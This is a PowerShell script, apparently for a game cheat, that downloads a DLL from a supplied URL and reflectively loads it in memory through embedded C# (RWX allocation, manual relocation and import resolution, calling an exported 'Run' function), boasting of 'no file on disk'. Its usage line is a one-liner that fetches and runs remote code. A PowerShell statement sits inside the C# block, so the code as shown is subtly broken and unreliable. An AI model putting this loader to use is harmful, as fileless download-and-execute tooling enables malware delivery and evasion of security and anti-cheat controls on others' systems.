# km jimmy external - fileless PowerShell loader
# Usage: powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOURNAME/YOURREPO/main/loader.ps1')"

param(
    [string]$DllUrl = "",
    [string]$DriverPath = ""
)

if ([string]::IsNullOrEmpty($DllUrl)) {
    Write-Host "[-] DllUrl not set. Provide raw GitHub URL to km_jimmy_ext.dll" -ForegroundColor Red
    exit 1
}

Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$bytes = $wc.DownloadData($DllUrl)
Write-Host "[+] Downloaded $($bytes.Length) bytes" -ForegroundColor Green

$source = @"
using System;
using System.Runtime.InteropServices;
using System.Reflection;

public class ReflectiveDll {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")] static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32")] static extern bool FreeLibrary(IntPtr hLibModule);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READONLY = 0x02;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint IMAGE_REL_BASED_DIR64 = 10;
    const uint IMAGE_REL_BASED_HIGHLOW = 3;

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS64 {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_BASE_RELOCATION {
        public uint VirtualAddress;
        public uint SizeOfBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_IMPORT_DESCRIPTOR {
        public uint OriginalFirstThunk;
        public uint TimeDateStamp;
        public uint ForwarderChain;
        public uint Name;
        public uint FirstThunk;
    }

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void RunDelegate([MarshalAs(UnmanagedType.LPWStr)] string driverPath);

    public static void Load(byte[] raw, string driverPath) {
        GCHandle handle = GCHandle.Alloc(raw, GCHandleType.Pinned);
        try {
            IntPtr pBase = handle.AddrOfPinnedObject();
            IMAGE_DOS_HEADER dos = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(pBase);
            if (dos.e_magic != 0x5A4D) throw new Exception("Invalid DOS signature");

            IntPtr pNt = pBase + dos.e_lfanew;
            IMAGE_NT_HEADERS64 nt = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(pNt);
            if (nt.Signature != 0x00004550) throw new Exception("Invalid PE signature");

            ulong prefBase = nt.OptionalHeader.ImageBase;
            uint imageSize = nt.OptionalHeader.SizeOfImage;

            IntPtr alloc = VirtualAlloc(IntPtr.Zero, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (alloc == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

            try {
                // Copy headers
                Marshal.Copy(raw, 0, alloc, (int)nt.OptionalHeader.SizeOfHeaders);

                // Copy sections
                IntPtr pSec = pNt + 4 + 20 + nt.FileHeader.SizeOfOptionalHeader;
                for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
                    IMAGE_SECTION_HEADER sec = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(pSec + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                    if (sec.SizeOfRawData > 0) {
                        Marshal.Copy(raw, (int)sec.PointerToRawData, alloc + (int)sec.VirtualAddress, (int)sec.SizeOfRawData);
                    }
                }

                // Process relocations
                uint relocDir = nt.OptionalHeader.DataDirectory[5].VirtualAddress;
                uint relocSize = nt.OptionalHeader.DataDirectory[5].Size;
                if (relocDir != 0 && relocSize != 0) {
                    long delta = (long)alloc - (long)prefBase;
                    uint processed = 0;
                    IntPtr pReloc = alloc + (int)relocDir;
                    while (processed < relocSize) {
                        IMAGE_BASE_RELOCATION reloc = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(pReloc);
                        if (reloc.SizeOfBlock == 0) break;
                        int count = (int)((reloc.SizeOfBlock - 8) / 2);
                        IntPtr pEntries = pReloc + 8;
                        for (int i = 0; i < count; i++) {
                            ushort entry = Marshal.ReadInt16(pEntries + i * 2);
                            uint type = (uint)(entry >> 12);
                            uint offset = (uint)(entry & 0xFFF);
                            if (type == IMAGE_REL_BASED_HIGHLOW) {
                                IntPtr pAddr = alloc + (int)reloc.VirtualAddress + (int)offset;
                                uint val = (uint)Marshal.ReadInt32(pAddr);
                                Marshal.WriteInt32(pAddr, (int)(val + delta));
                            } else if (type == IMAGE_REL_BASED_DIR64) {
                                IntPtr pAddr = alloc + (int)reloc.VirtualAddress + (int)offset;
                                ulong val = (ulong)Marshal.ReadInt64(pAddr);
                                Marshal.WriteInt64(pAddr, (long)(val + (ulong)delta));
                            }
                        }
                        processed += reloc.SizeOfBlock;
                        pReloc += (int)reloc.SizeOfBlock;
                    }
                }

                // Resolve imports
                uint importDir = nt.OptionalHeader.DataDirectory[1].VirtualAddress;
                uint importSize = nt.OptionalHeader.DataDirectory[1].Size;
                if (importDir != 0 && importSize != 0) {
                    IntPtr pImport = alloc + (int)importDir;
                    while (true) {
                        IMAGE_IMPORT_DESCRIPTOR desc = Marshal.PtrToStructure<IMAGE_IMPORT_DESCRIPTOR>(pImport);
                        if (desc.Name == 0) break;
                        string dllName = Marshal.PtrToStringAnsi(alloc + (int)desc.Name);
                        IntPtr hModule = LoadLibrary(dllName);
                        if (hModule == IntPtr.Zero) throw new Exception("Failed to load " + dllName);

                        IntPtr pThunk = alloc + (int)desc.FirstThunk;
                        IntPtr pOrigThunk = alloc + (int)desc.OriginalFirstThunk;
                        int idx = 0;
                        while (true) {
                            ulong orig = (ulong)Marshal.ReadInt64(pOrigThunk + idx * 8);
                            if (orig == 0) break;
                            IntPtr procAddr;
                            if ((orig & 0x8000000000000000) != 0) {
                                procAddr = GetProcAddress(hModule, "#" + (orig & 0xFFFF).ToString());
                            } else {
                                IntPtr pName = alloc + (int)(orig & 0xFFFFFFFF);
                                string name = Marshal.PtrToStringAnsi(pName + 2);
                                procAddr = GetProcAddress(hModule, name);
                            }
                            Marshal.WriteInt64(pThunk + idx * 8, (long)procAddr);
                            idx++;
                        }
                        pImport += Marshal.SizeOf<IMAGE_IMPORT_DESCRIPTOR>();
                    }
                }

                // Set section protections (simplified: leave RWX, but could be refined)

                // Call DllMain(DLL_PROCESS_ATTACH)
                IntPtr pEntry = alloc + (int)nt.OptionalHeader.AddressOfEntryPoint;
                DllMainDelegate dllMain = Marshal.GetDelegateForFunctionPointer<DllMainDelegate>(pEntry);
                dllMain(alloc, 1, IntPtr.Zero);

                // Find and call Run export
                uint exportDir = nt.OptionalHeader.DataDirectory[0].VirtualAddress;
                uint exportSize = nt.OptionalHeader.DataDirectory[0].Size;
                if (exportDir == 0 || exportSize == 0) throw new Exception("No export table");

                IntPtr pExport = alloc + (int)exportDir;
                uint funcCount = (uint)Marshal.ReadInt32(pExport + 20);
                uint nameCount = (uint)Marshal.ReadInt32(pExport + 24);
                IntPtr pFuncAddr = alloc + Marshal.ReadInt32(pExport + 28);
                IntPtr pNameAddr = alloc + Marshal.ReadInt32(pExport + 32);
                IntPtr pOrdAddr = alloc + Marshal.ReadInt32(pExport + 36);

                IntPtr pRun = IntPtr.Zero;
                for (uint i = 0; i < nameCount; i++) {
                    string name = Marshal.PtrToStringAnsi(alloc + Marshal.ReadInt32(pNameAddr + (int)i * 4));
                    if (name == "Run") {
                        ushort ord = (ushort)Marshal.ReadInt16(pOrdAddr + (int)i * 2);
                        pRun = alloc + Marshal.ReadInt32(pFuncAddr + ord * 4);
                        break;
                    }
                }

                if (pRun == IntPtr.Zero) throw new Exception("Run export not found");

                RunDelegate run = Marshal.GetDelegateForFunctionPointer<RunDelegate>(pRun);
                run(driverPath);

                Write-Host "[+] DLL executed from memory" -ForegroundColor Green
            } catch {
                VirtualFree(alloc, 0, MEM_RELEASE);
                throw;
            }
        } finally {
            handle.Free();
        }
    }
}
"@

Write-Host "[*] Compiling in-memory loader..." -ForegroundColor Cyan
Add-Type -TypeDefinition $source -Language CSharp
Write-Host "[+] Loader compiled" -ForegroundColor Green

Write-Host "[*] Reflective loading DLL..." -ForegroundColor Cyan
[ReflectiveDll]::Load($bytes, $DriverPath)

Write-Host "[+] Done. Cheat running from memory, no file on disk." -ForegroundColor Green
